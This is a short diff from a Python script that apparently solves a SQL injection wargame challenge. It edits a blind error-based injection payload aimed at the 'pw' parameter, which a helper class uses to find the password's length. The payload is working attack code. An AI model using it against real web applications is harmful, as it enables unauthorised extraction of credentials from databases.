@@ -33,7 +33,7 @@ def main():
     method = 'get'
     inj_param = 'pw'
 
-    payload = "'||if(length(pw)>%s,1,(select 1 union select 2))#"
+    payload = "'||if(length(pw)<%s,1,(select 1 union select 2))#"
     p = los.SqlInjection(url, cook, method, inj_param, payload)
     len_of_key = p.find_key_len(check_func)
 
